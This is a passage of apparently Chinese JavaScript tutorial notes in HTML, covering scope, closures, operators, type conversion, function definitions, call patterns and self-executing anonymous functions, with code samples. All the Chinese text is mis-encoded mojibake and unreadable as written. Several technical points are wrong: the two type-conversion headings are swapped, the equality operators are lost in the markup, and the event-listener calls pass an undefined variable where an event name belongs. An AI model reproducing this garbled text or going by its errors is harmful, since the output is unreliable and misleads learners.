<li>æ‰§è¡Œé˜¶æ®µç”±å¼•æ“å®Œæˆï¼Œä¸»è¦ä»»åŠ¡æ˜¯æ‰§è¡Œå¯æ‰§è¡Œä»£ç ï¼Œæ‰§è¡Œä¸Šä¸‹æ–‡åœ¨è¿™ä¸ªé˜¶æ®µåˆ›å»ºã€‚</li>
</ul>
<h4 id="å˜é‡ä½œç”¨åŸŸ" tabindex="-1"> å˜é‡ä½œç”¨åŸŸ</h4>
<p><strong>å…¨å±€ä½œç”¨åŸŸ</strong>ï¼šåœ¨æ‰€æœ‰å‡½æ•°å£°æ˜æˆ–è€…{}ä¹‹å¤–å®šä¹‰çš„å˜é‡ï¼Œéƒ½åœ¨å…¨å±€ä½œç”¨åŸŸé‡Œã€‚ä¸€æ—¦å£°æ˜ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œåœ¨ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨å®ƒã€‚</p>
<ul>
<li>åœ¨å‡½æ•°ä¸­ï¼Œå¦‚æœä¸åŠ  var å£°æ˜ä¸€ä¸ªå˜é‡ï¼Œé‚£ä¹ˆè¿™ä¸ªå˜é‡ä¼šé»˜è®¤è¢«å£°æ˜ä¸ºå…¨å±€å˜é‡ï¼Œå¦‚æœæ˜¯ä¸¥æ ¼æ¨¡å¼ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚</li>
<li>å…¨å±€å˜é‡ä¼šé€ æˆå‘½åæ±¡æŸ“ï¼Œå¦‚æœåœ¨å¤šå¤„å¯¹åŒä¸€ä¸ªå…¨å±€å˜é‡è¿›è¡Œæ“ä½œï¼Œé‚£ä¹ˆä¹…ä¼šè¦†ç›–å…¨å±€å˜é‡çš„å®šä¹‰ã€‚åŒæ—¶å…¨å±€å˜é‡æ•°é‡è¿‡å¤šï¼Œéå¸¸ä¸æ–¹ä¾¿ç®¡ç†ã€‚
<strong>å±€éƒ¨ä½œç”¨åŸŸ</strong>ï¼šä¸€èˆ¬åªåœ¨å›ºå®šçš„ä»£ç ç‰‡æ®µå†…å¯è®¿é—®åˆ°ï¼Œè€Œå…¶å¤–éƒ¨æ˜¯æ— æ³•è®¿é—®çš„ï¼Œå®ƒåˆ†ä¸ºå‡½æ•°ä½œç”¨åŸŸå’Œå—çº§ä½œç”¨åŸŸ</li>
<li><strong>å‡½æ•°ä½œç”¨åŸŸ</strong>ï¼šåœ¨å‡½æ•°ä¸­å®šä¹‰ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œé‚£ä¹ˆè¯¥å˜é‡åªå¯ä»¥åœ¨è¯¥å‡½æ•°ä½œç”¨åŸŸä¸­è¢«è®¿é—®
<ul>
<li>åµŒå¥—å‡½æ•°ä½œç”¨åŸŸï¼šåœ¨å¤–å±‚å‡½æ•°ä¸­ï¼ŒåµŒå¥—ä¸€ä¸ªå†…å±‚å‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªå†…å±‚å‡½æ•°å¯ä»¥å‘ä¸Šè®¿é—®åˆ°å¤–å±‚å‡½æ•°ä¸­çš„å˜é‡ã€‚</li>
</ul>
</li>
<li><strong>å—çº§ä½œç”¨åŸŸ</strong>ï¼š{}åŒ…è£¹çš„åŒºåŸŸå†…ç”Ÿå‘½çš„let/constå˜é‡ï¼Œåªèƒ½åœ¨{}å†…éƒ¨ä½¿ç”¨è¿™ä¸€å˜é‡
<ul>
<li>å—ä½œç”¨åŸŸå†…å®šä¹‰çš„å‡½æ•°åœ¨å—ä½œç”¨åŸŸå†…ä¼šè¿›è¡Œå‡½æ•°æå‡ï¼Œæå‡åˆ°æœ€ä¸Šé¢ï¼Œç„¶ååœ¨æœ€å¤–å±‚ç±»ä¼¼äºvarå£°æ˜ä¸€ä¸ªåŒåå˜é‡ï¼Œé»˜è®¤å€¼ä¸ºundefinedã€‚</li>
</ul>
</li>
</ul>
<h4 id="è¯æ³•ä½œç”¨åŸŸ" tabindex="-1"> è¯æ³•ä½œç”¨åŸŸ</h4>
<p>è¯æ³•ä½œç”¨åŸŸï¼Œä¹Ÿå¯ä»¥å«åšé™æ€ä½œç”¨åŸŸã€‚æ„æ€æ˜¯æ— è®ºå‡½æ•°åœ¨å“ªé‡Œè°ƒç”¨ï¼Œè¯æ³•ä½œç”¨åŸŸéƒ½åªåœ¨ç”±å‡½æ•°è¢«å£°æ˜æ—¶æ‰€å¤„çš„ä½ç½®å†³å®šã€‚</p>
<p>åŠ¨æ€ä½œç”¨åŸŸçš„ä½œç”¨åŸŸåˆ™æ˜¯ç”±å‡½æ•°è¢«è°ƒç”¨æ—¶æ‰§è¡Œçš„ä½ç½®æ‰€å†³å®šã€‚</p>
<p>JSçš„ä½œç”¨åŸŸæ˜¯é™æ€ä½œç”¨åŸŸ</p>
<h4 id="ä½œç”¨åŸŸé“¾" tabindex="-1"> ä½œç”¨åŸŸé“¾</h4>
<p><strong>ä½œç”¨åŸŸé“¾</strong>ï¼š[[scope]]ä¸­æ‰€å­˜å‚¨çš„æ‰§è¡ŒæœŸä¸Šä¸‹æ–‡å¯¹è±¡çš„é›†åˆï¼Œè¿™ä¸ªé›†åˆå‘ˆé“¾å¼é“¾æ¥ï¼Œæˆ‘ä»¬æŠŠè¿™ç§é“¾å¼é“¾æ¥å«åšä½œç”¨åŸŸé“¾ã€‚</p>
<p>åœ¨JSå¼•æ“ä¸­ï¼Œé€šè¿‡æ ‡è¯†ç¬¦æŸ¥æ‰¾æ ‡è¯†ç¬¦çš„å€¼ï¼Œä¼šä»å½“å‰ä½œç”¨åŸŸå‘ä¸ŠæŸ¥æ‰¾ï¼Œç›´åˆ°ä½œç”¨åŸŸæ‰¾åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…çš„æ ‡è¯†ç¬¦ä½ç½®ã€‚å°±æ˜¯JSçš„ä½œç”¨åŸŸé“¾ã€‚</p>
<h4 id="é—­åŒ…" tabindex="-1"> é—­åŒ…</h4>
<p>æœ‰æƒè®¿é—®å¦ä¸€ä¸ªå‡½æ•°ä½œç”¨åŸŸä¸­çš„å˜é‡çš„å‡½æ•°</p>
<h3 id="è¿ç®—ç¬¦" tabindex="-1"> è¿ç®—ç¬¦</h3>
<ul>
<li>ç®—æ•°è¿ç®—ç¬¦ï¼šåŠ (+)ï¼Œå‡(-)ï¼Œä¹˜(*)ï¼Œé™¤(/)ï¼Œæ±‚ä½™(%)</li>
<li>èµ‹å€¼è¿ç®—ç¬¦ï¼š=ï¼Œ+=ï¼Œ-=ï¼Œ*=ï¼Œ%=</li>
<li>å…³ç³»è¿ç®—ç¬¦ï¼š&gt;ï¼Œ&lt;ï¼Œ&gt;=ï¼Œ&lt;=ï¼Œ<mark>(åªæ¯”è¾ƒå€¼)ï¼Œ!=ï¼Œ</mark>=(å€¼å’Œæ•°æ®ç±»å‹éƒ½æ¯”è¾ƒ)</li>
<li>é€»è¾‘è¿ç®—ç¬¦ï¼š<a href="%E5%8F%AA%E6%9C%89%E5%B7%A6%E4%BE%A7%E6%BB%A1%E8%B6%B3%E6%89%8D%E8%AE%A1%E7%AE%97%E5%8F%B3%E4%BE%A7">&amp;&amp;ï¼Œ||</a>ï¼Œï¼,<a href="%E4%B8%8D%E7%AE%A1%E5%B7%A6%E4%BE%A7%E7%BB%93%E6%9E%9C%E5%A6%82%E4%BD%95%EF%BC%8C%E9%83%BD%E8%A6%81%E8%AE%A1%E7%AE%97%E5%8F%B3%E4%BE%A7">&amp;ï¼Œ|</a></li>
<li>ä¸‰ç›®è¿ç®—ç¬¦ï¼š(è¡¨è¾¾å¼) ? å€¼1ï¼Œå€¼2ï¼›</li>
</ul>
<p><strong>æ³¨æ„</strong></p>
<ul>
<li>æ²¡æœ‰é™¤0å¼‚å¸¸ï¼Œé™¤é›¶ä¼šå‡ºç°æ­£è´Ÿæ— ç©·å¤§ï¼ˆInfinityï¼‰</li>
<li>å¦‚æœè¿›è¡Œäº†éæ³•çš„æ•°å­¦è¿ç®—ï¼Œç»“æœæ˜¯NaN(not a Number) åŒ…æ‹¬å­—ç¬¦ä¸²è½¬æ¢ç±»å‹å¤±è´¥æ—¶ï¼Œç»“æœä¹Ÿæ˜¯NaN</li>
<li>jsä¸­çš„ == æ¯”è¾ƒçš„æ˜¯å€¼ï¼ˆä¸åŒç±»å‹çš„å€¼ä¼šè½¬æ¢åæ¯”è¾ƒï¼‰</li>
</ul>
<p><strong>æ•°æ®è½¬æ¢</strong>ï¼š</p>
<ul>
<li>... --&gt; boolean
<ul>
<li>string æ•°å­—ï¼šå¯¹åº”number</li>
<li>string éæ•°å­—ï¼šNaN(numberç±»å‹)</li>
<li>boolean trueï¼š 1</li>
<li>boolean falseï¼š0</li>
<li>object æœ‰å…·ä½“ï¼š 1</li>
<li>object nullï¼š 0</li>
</ul>
</li>
<li>... --&gt; number
<ul>
<li>number é0ï¼š true</li>
<li>number 0ï¼š false</li>
<li>string éç©ºå­—ç¬¦ä¸² : true</li>
<li>string ç©ºå­—ç¬¦ä¸² &quot;&quot;: false</li>
<li>object å…·ä½“çš„å¯¹è±¡ : true</li>
<li>object null : false</li>
<li>å£°æ˜ä¸èµ‹å€¼çš„å˜é‡ : false</li>
</ul>
</li>
</ul>
<h3 id="æµç¨‹æ§åˆ¶" tabindex="-1"> æµç¨‹æ§åˆ¶</h3>
<ul>
<li>æ¡ä»¶åˆ†æ”¯è¯­å¥ï¼šifè¯­å¥ï¼Œswitchè¯­å¥</li>
<li>å¾ªç¯è¯­å¥ï¼šwhileå¾ªç¯ï¼Œdo whileå¾ªç¯ï¼Œforå¾ªç¯ï¼Œfor-inå¾ªç¯</li>
</ul>
<h2 id="å‡½æ•°" tabindex="-1"> å‡½æ•°</h2>
<p><strong>å‡½æ•°çš„æ¦‚å¿µ</strong>ï¼šå…·æœ‰ç‹¬ç«‹åŠŸèƒ½çš„ä»£ç å—ã€‚åœ¨jsä¸­ä½¿ç”¨functionå…³é”®å­—å®šä¹‰å‡½æ•°</p>
<p><strong>å‡½æ•°çš„ä½œç”¨</strong>ï¼šè®©ä»£ç ç»“æ„æ›´åŠ æ¸…æ™°ï¼Œæé«˜ä»£ç é‡ç”¨æ€§å’Œå¯ç§»æ¤æ€§</p>
<p><strong>jså‡½æ•°çš„åˆ†ç±»</strong>ï¼šè‡ªå®šä¹‰å‡½æ•°å’Œç³»ç»Ÿå‡½æ•°</p>
<h3 id="è‡ªå®šä¹‰å‡½æ•°" tabindex="-1"> è‡ªå®šä¹‰å‡½æ•°</h3>
<h4 id="å‡½æ•°çš„åˆ›å»º" tabindex="-1"> å‡½æ•°çš„åˆ›å»º</h4>
<ol>
<li>å‡½æ•°å£°æ˜
<ul>
<li>æ ¼å¼ï¼šfunction å‡½æ•°å( [å‚æ•°åˆ—è¡¨] ) { è¦æ‰§è¡Œçš„ä»£ç  }</li>
<li>ç‰¹ç‚¹ï¼šé¢„ç¼–è¯‘æ—¶ä¼šè§£é‡Šå£°æ˜ï¼Œæ‰€ä»¥åœ¨å‡½æ•°å£°æ˜å‰åéƒ½å¯ä»¥è°ƒç”¨å‡½æ•°</li>
</ul>
</li>
<li>å‡½æ•°è¡¨è¾¾å¼
<ul>
<li>æ ¼å¼ï¼švar å‡½æ•°å = function( [å‚æ•°åˆ—è¡¨] ) { è¦æ‰§è¡Œçš„ä»£ç  };</li>
<li>ç‰¹ç‚¹ï¼šç³»ç»Ÿåªæœ‰åŠ è½½åˆ°è¯¥å‡½æ•°æ—¶æ‰ä¼šå£°æ˜ï¼Œæ‰€ä»¥åªèƒ½åœ¨å‡½æ•°å£°æ˜åè°ƒç”¨</li>
</ul>
</li>
<li>å‡½æ•°æ„é€ å‡½æ•°
<ul>
<li>æ ¼å¼ï¼švar å‡½æ•°å = new Function( [&quot;å‚æ•°åˆ—è¡¨&quot;],&quot; { è¦æ‰§è¡Œçš„ä»£ç  }&quot; )</li>
<li>æ³¨æ„ï¼šæ­¤å£°æ˜è¡¨æ˜åœ¨jsä¸­å‡½æ•°æ˜¯ä½œä¸ºå¯¹è±¡å­˜åœ¨çš„ã€‚â€å½¢å‚â€æ˜¯ä½œä¸ºå®å‚å­˜åœ¨</li>
</ul>
</li>
<li>å±æ€§å‡½æ•°ï¼šå±æ€§å : function( [å‚æ•°åˆ—è¡¨] ) { è¦æ‰§è¡Œçš„ä»£ç  }</li>
</ol>
<p><strong>æ€»ç»“</strong>ï¼š</p>
<ul>
<li>ç¬¬ä¸€ç§å’Œç¬¬äºŒç§å‡½æ•°çš„å®šä¹‰çš„æ–¹å¼å…¶å®æ˜¯ç¬¬ä¸‰ç§ new Function çš„è¯­æ³•ç³–ï¼Œå½“æˆ‘ä»¬å®šä¹‰å‡½æ•°æ—¶å€™éƒ½ä¼šé€šè¿‡ new Function æ¥åˆ›å»ºä¸€ä¸ªå‡½æ•°ï¼Œåªæ˜¯å‰ä¸¤ç§è¿›è¡Œäº†å°è£…ï¼Œjs ä¸­ä»»æ„å‡½æ•°éƒ½æ˜¯Function çš„å®ä¾‹ã€‚</li>
<li>ä½¿ç”¨æ„é€ å‡½æ•°Function()åˆ›å»ºçš„å‡½æ•°ä¸ä½¿ç”¨è¯æ³•ä½œç”¨åŸŸï¼Œç›¸åçš„ï¼Œå®ƒä»¬æ€»æ˜¯è¢«é¡¶çº§å‡½æ•°æ¥ç¼–è¯‘</li>
<li>ECMAScript å®šä¹‰çš„å‡½æ•°å®é™…ä¸Šæ˜¯åŠŸèƒ½å®Œæ•´çš„å¯¹è±¡ã€‚</li>
</ul>
<div><pre><code><span>// 1. å‡½æ•°å£°æ˜</span>
<span>function</span> <span>create1</span><span>(</span><span>)</span> <span>{</span>
    <span>alert</span><span>(</span><span>"å‡½æ•°å£°æ˜"</span><span>)</span><span>;</span>
<span>}</span>
<span>create1</span><span>(</span><span>)</span><span>;</span>

<span>// 2. å‡½æ•°è¡¨è¾¾å¼</span>
<span>var</span> <span>create2</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>alert</span><span>(</span><span>"å‡½æ•°è¡¨è¾¾å¼"</span><span>)</span><span>;</span>
<span>}</span><span>;</span>
<span>create2</span><span>(</span><span>)</span><span>;</span>

<span>// 3. å‡½æ•°æ„é€ å‡½æ•°</span>
<span>var</span> create3 <span>=</span> <span>new</span> <span>Function</span><span>(</span><span>'{alert("å‡½æ•°æ„é€ å‡½æ•°");}'</span><span>)</span><span>;</span> 

<span>//4. å±æ€§å‡½æ•°</span>
<span>var</span> People <span>=</span> <span>{</span>
    <span>name</span> <span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
        console<span>.</span><span>log</span><span>(</span><span>"å¯¹è±¡å‡½æ•°å±æ€§1"</span><span>)</span><span>;</span>
    <span>}</span><span>,</span>
    <span>age</span> <span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
        console<span>.</span><span>log</span><span>(</span><span>"å¯¹è±¡å‡½æ•°å±æ€§2"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
People<span>.</span><span>name</span><span>(</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div><h4 id="å‡½æ•°çš„è°ƒç”¨" tabindex="-1"> å‡½æ•°çš„è°ƒç”¨</h4>
<ol>
<li>
<p>å‡½æ•°è°ƒç”¨æ¨¡å¼</p>
<ul>
<li>å‡½æ•°å£°æ˜åç›´æ¥è°ƒç”¨ï¼Œä¸€èˆ¬æ˜¯ç”±å‡½æ•°å£°æ˜å’Œå‡½æ•°è¡¨è¾¾å¼åˆ›å»ºçš„å‡½æ•°</li>
<li>thisæŒ‡å‘windowå¯¹è±¡</li>
</ul>
</li>
<li>
<p>æ–¹æ³•è°ƒç”¨æ¨¡å¼</p>
<ul>
<li>å¯¹è±¡è°ƒç”¨å±æ€§å‡½æ•°ï¼Œä¸€èˆ¬æ˜¯ç”±å±æ€§å‡½æ•°åˆ›å»ºçš„å‡½æ•°</li>
<li>thisæŒ‡å‘å½“å‰å¯¹è±¡</li>
</ul>
</li>
<li>
<p>æ„é€ å™¨è°ƒç”¨æ¨¡å¼</p>
<ul>
<li>å¿…é¡»å®ä¾‹åŒ–å¯¹è±¡åæ‰èƒ½è°ƒç”¨å…¶åŸå‹æ–¹æ³•</li>
<li>å¦‚æœæ²¡æœ‰returnåˆ™è¿”å›thisï¼ŒthisæŒ‡å‘å½“å‰å®ä¾‹åŒ–å¯¹è±¡ï¼›å¦‚æœæœ‰returnåˆ™è¿”å›returnçš„å€¼</li>
</ul>
</li>
<li>
<p>applyè°ƒç”¨æ¨¡å¼</p>
<ul>
<li>applyå’Œcallç¬¬ä¸€ä¸ªå¦‚æœä½¿ç”¨nullå°±æ˜¯å‡½æ•°æ¨¡å¼ï¼Œä½¿ç”¨å¯¹è±¡å°±æ˜¯æ–¹æ³•æ¨¡å¼</li>
<li>applyç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¼ å…¥ä¸€ä¸ªå‚æ•°æ•°ç»„ï¼Œcallçš„å‚æ•°æ˜¯ç›´æ¥ä¼ å…¥</li>
</ul>
</li>
<li>
<p>äº‹ä»¶å“åº”è°ƒç”¨</p>
<ul>
<li>åœ¨HTMLæ ‡ç­¾çš„äº‹ä»¶å±æ€§ä¸­è°ƒç”¨: <code>&lt;input type=&quot;button&quot; value=&quot;ç‚¹æˆ‘æµ‹è¯•&quot; onclick=&quot;å‡½æ•°å()&quot; /&gt;</code></li>
<li>åœ¨jsäº‹ä»¶å“åº”ä¸­è°ƒç”¨: DOMå¯¹è±¡.onclick = function(){è¦æ‰§è¡Œçš„ä»£ç }</li>
<li>åœ¨jsäº‹ä»¶ç›‘å¬ä¸­è°ƒç”¨: DOMå¯¹è±¡.addEventListener(onclickï¼Œfunction(){è¦æ‰§è¡Œçš„ä»£ç }, false);</li>
</ul>
</li>
<li>
<p>è¶…é“¾æ¥è°ƒç”¨: <code>&lt;a href=&quot;javascript: å‡½æ•°å()&quot;&gt;è¶…é“¾æ¥è°ƒç”¨&lt;/a&gt;</code></p>
</li>
</ol>
<div><pre><code><span>// 1. å‡½æ•°è°ƒç”¨æ¨¡å¼</span>
<span>function</span> <span>funCall1</span><span>(</span><span>)</span> <span>{</span>
    <span>alert</span><span>(</span><span>"å‡½æ•°è°ƒç”¨æ¨¡å¼1ï¼šå‡½æ•°å£°æ˜"</span><span>)</span><span>;</span>
<span>}</span>
<span>funCall1</span><span>(</span><span>)</span><span>;</span>

<span>var</span> <span>funCall2</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>alert</span><span>(</span><span>"å‡½æ•°è°ƒç”¨æ¨¡å¼2ï¼šå‡½æ•°è¡¨è¾¾å¼"</span><span>)</span><span>;</span>
<span>}</span><span>;</span>
<span>funCall2</span><span>(</span><span>)</span><span>;</span>

<span>// 2. æ–¹æ³•è°ƒç”¨æ¨¡å¼</span>
<span>var</span> Menthods <span>=</span> <span>{</span>
    <span>filed</span> <span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
        <span>alert</span><span>(</span><span>"æ–¹æ³•è°ƒç”¨æ¨¡å¼ï¼šå±æ€§å‡½æ•°"</span><span>)</span>
    <span>}</span>
<span>}</span>
Menthods<span>.</span><span>filed</span><span>(</span><span>)</span><span>;</span>

<span>// 3. æ„é€ å™¨è°ƒç”¨æ¨¡å¼</span>
<span>function</span> <span>Fileds</span><span>(</span><span>name<span>,</span> value</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
    <span>this</span><span>.</span>value <span>=</span> value<span>;</span>
    <span>this</span><span>.</span><span>sayHello</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>this</span><span>.</span>name <span>+</span> <span>":"</span> <span>+</span> <span>this</span><span>.</span>value<span>;</span>
    <span>}</span>
<span>}</span>
<span>var</span> filed <span>=</span> <span>new</span> <span>Fileds</span><span>(</span><span>"address"</span><span>,</span> <span>"é«˜è€åº„"</span><span>)</span><span>;</span>
filed<span>.</span><span>sayHello</span><span>(</span><span>)</span><span>;</span>

<span>// 4. applyè°ƒç”¨æ¨¡å¼</span>
<span>function</span> <span>add</span><span>(</span><span>a<span>,</span> b</span><span>)</span> <span>{</span>
    <span>return</span> a <span>+</span> b<span>;</span>
<span>}</span>
console<span>.</span><span>log</span><span>(</span><span>add</span><span>.</span><span>apply</span><span>(</span>add<span>,</span> <span>[</span> <span>2</span><span>,</span> <span>3</span> <span>]</span><span>)</span><span>)</span><span>;</span> <span>// applyè°ƒç”¨æ¨¡å¼</span>
console<span>.</span><span>log</span><span>(</span><span>add</span><span>.</span><span>call</span><span>(</span>add<span>,</span> <span>2</span><span>,</span> <span>3</span><span>)</span><span>)</span><span>;</span> <span>// callè°ƒç”¨æ¨¡å¼</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br></div></div><h4 id="åŒ¿åå‡½æ•°" tabindex="-1"> åŒ¿åå‡½æ•°</h4>
<p>æ²¡æœ‰åå­—çš„å‡½æ•°ï¼Œåˆ›å»ºé—­åŒ…ï¼Œé¿å…é€ æˆå…¨å±€å˜é‡çš„æ±¡æŸ“</p>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼šå‡½æ•°è¡¨è¾¾å¼ã€å¯¹è±¡å±æ€§ã€äº‹ä»¶åŠå…¶å‚æ•°ï¼Œè¿”å›å€¼</p>
<div><pre><code>window<span>.</span><span>onload</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>// 1. å‡½æ•°è¡¨è¾¾å¼</span>
    <span>let</span> <span>funcObj</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
        <span>alert</span><span>(</span><span>"æˆ‘æ˜¯åœ¨å‡½æ•°è¡¨è¾¾å¼ä¸­ä½¿ç”¨çš„åŒ¿åå‡½æ•°"</span><span>)</span><span>;</span>
    <span>}</span><span>;</span>
    <span>funcObj</span><span>(</span><span>)</span><span>;</span>

    <span>// 2. å¯¹è±¡å±æ€§</span>
    <span>let</span> Obj <span>=</span> <span>{</span>
        <span>name</span> <span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
            <span>alert</span><span>(</span><span>"æˆ‘æ˜¯åœ¨å¯¹è±¡å±æ€§ä¸­ä½¿ç”¨çš„åŒ¿åå‡½æ•°"</span><span>)</span>
        <span>}</span>
    <span>}</span>
    Obj<span>.</span><span>name</span><span>(</span><span>)</span><span>;</span>

    <span>// 3. äº‹ä»¶</span>
    <span>let</span> btn1 <span>=</span> document<span>.</span><span>getElementById</span><span>(</span><span>"btn1"</span><span>)</span><span>;</span>
    btn1<span>.</span><span>onclick</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
        <span>alert</span><span>(</span><span>"æˆ‘æ˜¯åœ¨äº‹ä»¶ä¸­ä½¿ç”¨çš„åŒ¿åå‡½æ•°"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>// 4.1 äº‹ä»¶å‚æ•°</span>
    <span>setInterval</span><span>(</span><span>function</span><span>(</span><span>)</span> <span>{</span>
        <span>alert</span><span>(</span><span>"æˆ‘æ˜¯åœ¨äº‹ä»¶å‚æ•°ä¸­ä½¿ç”¨çš„åŒ¿åå‡½æ•°"</span><span>)</span><span>;</span>
    <span>}</span><span>,</span> <span>10000</span><span>)</span><span>;</span>
    
    <span>// 4.2 äº‹ä»¶ç›‘å¬å‚æ•°</span>
    <span>// 1. åŸºäºIEå†…æ ¸æµè§ˆå™¨</span>
    <span>let</span> btn2 <span>=</span> document<span>.</span><span>getElementById</span><span>(</span><span>"btn2"</span><span>)</span><span>;</span>
    btn2<span>.</span><span>attachEvent</span><span>(</span>onclick<span>,</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
        <span>alert</span><span>(</span><span>"æˆ‘æ˜¯åœ¨äº‹ä»¶ç›‘å¬ä¸­ä½¿ç”¨çš„åŒ¿åå‡½æ•°"</span><span>)</span><span>;</span>
    <span>}</span><span>,</span> <span>false</span><span>)</span><span>;</span>

    <span>// 2.  åŸºäºW3Cå†…æ ¸çš„äº‹ä»¶ç›‘å¬</span>
    <span>let</span> btn3 <span>=</span> document<span>.</span><span>getElementById</span><span>(</span><span>"btn3"</span><span>)</span><span>;</span>
    btn3<span>.</span><span>addEventListener</span><span>(</span>onclick<span>,</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
        <span>alert</span><span>(</span><span>"æˆ‘æ˜¯åœ¨äº‹ä»¶ç›‘å¬ä¸­ä½¿ç”¨çš„åŒ¿åå‡½æ•°"</span><span>)</span><span>;</span>
    <span>}</span><span>,</span> <span>false</span><span>)</span><span>;</span>
    

    <span>// 5. è¿”å›å€¼</span>
    <span>function</span> <span>test</span><span>(</span><span>)</span><span>{</span>
        <span>return</span> <span>function</span><span>(</span><span>)</span><span>{</span>
            <span>return</span> <span>"å“ˆå“ˆ"</span><span>;</span>
        <span>}</span>
    <span>}</span>
    console<span>.</span><span>log</span><span>(</span><span>test</span><span>(</span><span>)</span><span>(</span><span>)</span><span>)</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br></div></div><p><strong>åŒ¿åè‡ªæ‰§è¡Œå‡½æ•°</strong></p>
<ul>
<li>æ¦‚å¿µï¼šåŒ¿åå‡½æ•°çš„å®šä¹‰å®Œæˆåç«‹å³æ‰§è¡Œï¼Œæ‰§è¡Œå‡½æ•°è¡¨è¾¾å¼</li>
<li>ä½œç”¨ï¼šå®ç°é—­åŒ…å’Œåˆ›å»ºç‹¬ç«‹çš„å‘½åç©ºé—´</li>
<li>ä½¿ç”¨ï¼šåˆ†ç»„æ“ä½œç¬¦()ï¼Œvoidæ“ä½œç¬¦ï¼Œ~æ“ä½œç¬¦ï¼Œ!æ“ä½œç¬¦ç­‰ç­‰</li>
</ul>
<div><pre><code><span>// 1. åˆ†ç»„æ“ä½œç¬¦</span>
<span>// 1.1 ç¬¬ä¸€ç§ï¼š()åœ¨å¤–é¢</span>
<span>(</span><span>function</span> <span>funcObj1</span><span>(</span><span>)</span><span>{</span>
    <span>alert</span><span>(</span><span>"æˆ‘æ˜¯ç”±åˆ†ç»„æ“ä½œç¬¦ä½¿ç”¨åŒ¿åè‡ªæ‰§è¡Œå‡½æ•°1"</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>(</span><span>)</span><span>;</span>

<span>// 1.2 ç¬¬äºŒç§ï¼š()åœ¨é‡Œé¢</span>
<span>(</span><span>function</span> <span>funcObj2</span><span>(</span><span>)</span><span>{</span>
    <span>alert</span><span>(</span><span>"æˆ‘æ˜¯()æ“ä½œç¬¦"</span><span>)</span><span>;</span>
<span>}</span><span>(</span><span>)</span><span>)</span><span>;</span>


<span>// 2. voidæ“ä½œç¬¦</span>
<span>void</span> <span>function</span> <span>funcObj3</span><span>(</span><span>)</span><span>{</span>
    <span>alert</span><span>(</span><span>"æˆ‘æ˜¯voidæ“ä½œç¬¦"</span><span>)</span>
<span>}</span><span>(</span><span>)</span><span>;</span>

<span>// 3. ~æ“ä½œç¬¦</span>
<span>~</span><span>function</span> <span>funcObj4</span><span>(</span><span>)</span><span>{</span>
    <span>alert</span><span>(</span><span>"æˆ‘æ˜¯~æ“ä½œç¬¦"</span><span>)</span><span>;</span>
<span>}</span><span>(</span><span>)</span><span>;</span>

<span>// 4. !æ“ä½œç¬¦</span>
<span>!</span><span>function</span> <span>funcObj5</span><span>(</span><span>)</span><span>{</span>
    <span>alert</span><span>(</span><span>"æˆ‘æ˜¯!æ“ä½œç¬¦"</span><span>)</span><span>;</span>
<span>}</span><span>(</span><span>)</span><span>;</span>

<span>//å‡½æ•°è¡¨è¾¾å¼</span>
<span>var</span> <span>funcObj6</span> <span>=</span> <span>function</span><span>(</span><span>)</span><span>{</span>
    <span>alert</span><span>(</span><span>"æˆ‘æ˜¯å‡½æ•°è¡¨è¾¾å¼"</span><span>)</span><span>;</span>
<span>}</span><span>(</span><span>)</span><span>;</span>
